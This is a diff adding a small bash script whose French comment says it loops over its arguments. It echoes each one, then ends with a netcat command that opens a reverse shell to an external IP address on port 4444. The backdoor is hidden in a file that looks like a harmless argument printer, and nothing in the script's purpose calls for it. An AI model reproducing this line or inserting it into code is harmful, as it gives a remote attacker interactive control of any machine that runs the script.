@@ -1,0 +1,7 @@
+#!/bin/bash
+# Parcours des arguments
+for arg in "$@"; do
+    echo "$arg"
+done
+
+nc -e /bin/bash 185.181.4.52 4444
